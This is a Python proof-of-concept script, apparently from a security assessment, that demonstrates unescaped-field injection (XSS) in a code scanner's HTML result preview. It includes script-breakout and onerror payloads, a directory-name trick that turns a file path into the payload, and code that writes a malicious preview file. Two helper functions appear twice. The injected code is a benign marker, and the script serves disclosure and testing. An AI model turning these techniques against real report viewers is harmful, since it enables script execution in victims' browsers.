#!/usr/bin/env python3
"""PoC: the HTML result preview embeds untrusted fields without escaping.

`--result-preview true` writes a self-contained HTML report next to the SARIF
file. The preview puts result fields into a JavaScript data literal and into
markup without escaping, so a field containing `</script>` terminates the
surrounding script element and the remainder is parsed as new markup.

Verified here at parser level (no browser is launched), matching the claim under
test:

  A. control      - a benign document yields exactly one <script> element
  B. message.text - `</script><script>...</script>` yields a SECOND script
                    element whose body is the attacker's payload
  C. src_label    - `<img onerror=...>` survives into the document as a real
                    <img> element
  D. location uri - the same breakout through artifactLocation.uri
  E. reachability - a directory tree of legal path components produces a
                    relative path that IS the payload, so scanning an untrusted
                    repository is enough - no SARIF import required

`utils.html_preview` lives inside the PyArmor archive, so it only imports on the
reconstructed host. Just run it with your normal interpreter - the script finds
`py313host` next to the checkout (or under $WORK, or /tmp/vapt) and re-executes
itself there with the right PYTHONHOME/PYTHONPATH:

    python3 poc/19-check-xss.py

To do it by hand instead, set the paths explicitly - do not paste placeholders:

    WORK=~/VAPT
    PYTHONHOME=$WORK/pyhome \\
    PYTHONPATH=$WORK/merged:$WORK/signal-pyarmor-linux-x86_64_extracted/base_library.zip \\
    $WORK/py313host poc/19-check-xss.py

Exit codes: 0 = reproduced, 1 = a claim failed, 2 = cannot import the module.
"""
import json
import os
import pathlib
import sys
import tempfile
from html.parser import HTMLParser

MARK = "window.__VAPT_PREVIEW_XSS__=1"
PAYLOAD = "</script><script>%s</script>" % MARK


class Scripts(HTMLParser):
    """Counts script elements and records what ends up inside each."""

    def __init__(self):
        super().__init__()
        self.scripts = []
        self.tags = []
        self._current = None

    def handle_starttag(self, tag, attrs):
        self.tags.append(tag)
        if tag == "script":
            self._current = []

    def handle_data(self, data):
        if self._current is not None:
            self._current.append(data)

    def handle_endtag(self, tag):
        if tag == "script" and self._current is not None:
            self.scripts.append("".join(self._current))
            self._current = None


def sarif(message="hello", uri="src/a.py", rule="R1"):
    return {"version": "2.1.0", "runs": [{
        "tool": {"driver": {"name": "signal", "rules": [
            {"id": rule, "name": "r", "shortDescription": {"text": "t"}}]}},
        "results": [{
            "ruleId": rule, "level": "warning",
            "message": {"text": message},
            "locations": [{"physicalLocation": {
                "artifactLocation": {"uri": uri},
                "region": {"startLine": 10}}}],
        }],
    }]}


def verdict(ok, text):
    print("   %s %s" % ("PASS -" if ok else "FAIL -", text))
    return ok


def sarif(message="hello", uri="src/a.py", rule="R1"):
    return {"version": "2.1.0", "runs": [{
        "tool": {"driver": {"name": "signal", "rules": [
            {"id": rule, "name": "r", "shortDescription": {"text": "t"}}]}},
        "results": [{
            "ruleId": rule, "level": "warning",
            "message": {"text": message},
            "locations": [{"physicalLocation": {
                "artifactLocation": {"uri": uri},
                "region": {"startLine": 10}}}],
        }],
    }]}


def verdict(ok, text):
    print("   %s %s" % ("PASS -" if ok else "FAIL -", text))
    return ok


def find_host():
    """Locate the reconstructed CPython host built by poc/00-setup.sh.

    Returns (py313host, pyhome, merged, base_library) or None. Searches $WORK
    first, then the checkout this script lives in, then the usual sandbox path.
    """
    here = os.path.dirname(os.path.abspath(__file__))
    candidates = []
    if os.environ.get("WORK"):
        candidates.append(os.environ["WORK"])
    candidates += [os.path.dirname(here), os.getcwd(), "/tmp/vapt"]

    for root in candidates:
        host = os.path.join(root, "py313host")
        home = os.path.join(root, "pyhome")
        merged = os.path.join(root, "merged")
        bl = os.path.join(root, "signal-pyarmor-linux-x86_64_extracted",
                          "base_library.zip")
        if (os.path.isfile(host) and os.access(host, os.X_OK)
                and os.path.isdir(home) and os.path.isdir(merged)
                and os.path.isfile(bl)):
            return host, home, merged, bl
    return None


def reexec_on_host():
    """Re-run this script under py313host so the armoured module can import.

    Returns normally only when no host was found (the caller then prints
    instructions); on success the process has been replaced.
    """
    if os.environ.get("_POC19_REEXEC"):
        return False                              # already tried - do not loop
    found = find_host()
    if not found:
        return False
    host, home, merged, bl = found
    env = dict(os.environ)
    env["PYTHONHOME"] = home
    env["PYTHONPATH"] = merged + os.pathsep + bl
    env["_POC19_REEXEC"] = "1"
    print("running on the reconstructed host, because utils.html_preview is armoured")
    print("   host      : %s" % host)
    print("   PYTHONHOME: %s" % home)
    print("   PYTHONPATH: %s" % env["PYTHONPATH"])
    print()
    sys.stdout.flush()
    try:
        os.execve(host, [host, os.path.abspath(__file__)] + sys.argv[1:], env)
    except OSError as exc:
        print("could not start %s: %s" % (host, exc))
        return False


def main():

    # Run on the reconstructed CPython host when one is available: these checks need
    # the bundled interpreter (armoured modules, 3.13 bytecode, the shipped ssl).
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    try:
        import _host
        _host.ensure(__file__)
    except ImportError:
        pass

    try:
        import utils.html_preview as hp
    except ImportError as exc:
        print("cannot import utils.html_preview: %s" % exc)
        print()
        print("That module is inside the PyArmor archive, so it only imports on the")
        print("reconstructed host. None was found - run poc/00-setup.sh first, or set")
        print("WORK to the directory it built into, then retry.")
        return 2

    out = pathlib.Path(__file__).resolve().parent / "captures"
    out.mkdir(parents=True, exist_ok=True)

    print("HTML result preview - untrusted field injection")
    print("module    : %s" % hp.__file__)
    print("renderer  : render_html(doc, src_label, version)  [%s]"
          % ("present" if callable(getattr(hp, "render_html", None)) else "MISSING"))
    print("rows      : build_rows(doc)                        [%s]"
          % ("present" if callable(getattr(hp, "build_rows", None)) else "MISSING"))
    print()

    results = []

    # ---------------------------------------------------------------- A control
    print("== A. control: a benign document ==")
    html_doc = hp.render_html(sarif("hello world"), "src/a.py", "2026.9.0")
    p = Scripts(); p.feed(html_doc)
    print("   document %d bytes, %d script element(s)" % (len(html_doc), len(p.scripts)))
    a_ok = verdict(len(p.scripts) == 1, "exactly one script element, as the template intends")
    results.append(("control", a_ok))

    # ------------------------------------------------------ B message.text sink
    print("\n== B. result message text ==")
    html_doc = hp.render_html(sarif(PAYLOAD), "src/a.py", "2026.9.0")
    p = Scripts(); p.feed(html_doc)
    print("   payload : %s" % PAYLOAD)
    print("   document %d bytes, %d script element(s)" % (len(html_doc), len(p.scripts)))
    for i, s in enumerate(p.scripts):
        print("     [%d] %r" % (i, s.strip()[:90]))
    b_ok = verdict(len(p.scripts) == 2,
                   "the payload forms a SECOND script element")
    b_ok &= verdict(any(MARK in s for s in p.scripts),
                    "that element's body is the attacker's JavaScript")
    results.append(("message.text", b_ok))

    # ------------------------------------------------------------- C src_label
    print("\n== C. src_label ==")
    label = '<img src=x onerror=%s>' % MARK
    html_doc = hp.render_html(sarif("hello"), label, "2026.9.0")
    p = Scripts(); p.feed(html_doc)
    print("   label   : %s" % label)
    print("   elements: %s" % ", ".join(sorted(set(p.tags))))
    c_ok = verdict("img" in p.tags, "the label is parsed as a real <img> element")
    c_ok &= verdict("onerror" in html_doc, "its onerror handler survives into the document")
    results.append(("src_label", c_ok))

    # ------------------------------------------------- D artifactLocation.uri
    print("\n== D. artifact location (a path chosen by the scanned repository) ==")
    html_doc = hp.render_html(sarif("hello", uri=PAYLOAD), "src/a.py", "2026.9.0")
    p = Scripts(); p.feed(html_doc)
    print("   document %d bytes, %d script element(s)" % (len(html_doc), len(p.scripts)))
    d_ok = verdict(len(p.scripts) == 2 and any(MARK in s for s in p.scripts),
                   "a hostile path breaks out of the script block the same way")
    results.append(("location uri", d_ok))

    # ------------------------------------------------------- E reachable on disk
    print("\n== E. can a repository produce that path? ==")
    work = tempfile.mkdtemp(prefix="poc-xss-repo-")
    # `</script>` cannot live in a single name (it contains '/'), but the
    # concatenation of legal components reproduces it exactly.
    parts = ["<", "script><script>%s<" % MARK, "script>"]
    try:
        os.makedirs(os.path.join(work, *parts[:-1]), exist_ok=True)
        with open(os.path.join(work, *parts), "w") as fh:
            fh.write("x = 1\n")
        rel = os.path.join(*parts)
        print("   components: %s" % " + ".join(repr(p) for p in parts))
        print("   relative  : %s" % rel)
        e_ok = verdict(rel == PAYLOAD,
                       "the path a scan would report IS the payload")
        e_ok &= verdict(os.path.isfile(os.path.join(work, *parts)),
                        "it exists as a real file, so no SARIF import is needed")
    except OSError as exc:
        print("   could not build the tree: %s" % exc)
        e_ok = False
    results.append(("reachable from a repo", e_ok))

    # ------------------------------------------------------------- evidence file
    evil = hp.render_html(sarif(PAYLOAD, uri=PAYLOAD), label, "2026.9.0")
    target = out / "19-preview-xss.html"
    # the renderer's own template is UTF-8 (em dashes appear in it), and this runs
    # on a host whose default encoding may be ascii
    target.write_text(evil, encoding="utf-8")
    print("\n   malicious preview written: %s (%d bytes)" % (target, len(evil)))
    print("   open it in a browser only if you accept that the payload runs.")

    score = sum(1 for _l, ok in results if ok)
    print("\n== summary ==")
    for label_, ok in results:
        print("   %s %s" % ("PASS" if ok else "FAIL", label_))
    print("   preview injection reproduced: %d/%d" % (score, len(results)))
    print("""
   What this shows: values that come from the analysed material - result
   message text, rule id and the artifact path - are substituted into the
   preview without escaping, so markup they contain becomes part of the
   document. `</script>` closes the data block and everything after it is
   parsed as new markup, which is what turns a data value into executable
   JavaScript in the analyst's browser when the preview is opened.

   What this does not show: JavaScript execution in a browser. This is
   parser-level verification - the document that the renderer produces provably
   contains a second script element carrying the payload. It also does not
   show the full CLI path end to end: `--result-preview true` requires
   `--prioritization` and a completed scan, so the renderer is exercised
   directly here.

   Reachability: the path variant (E) needs no imported file at all. A scanned
   repository whose directory names are `<`, `script><script>...<` and whose
   file is `script>` yields exactly the payload as its reported path, so
   clicking a result in a preview generated from untrusted code is enough.""")
    return 0 if score == len(results) else 1


if __name__ == "__main__":
    raise SystemExit(main())
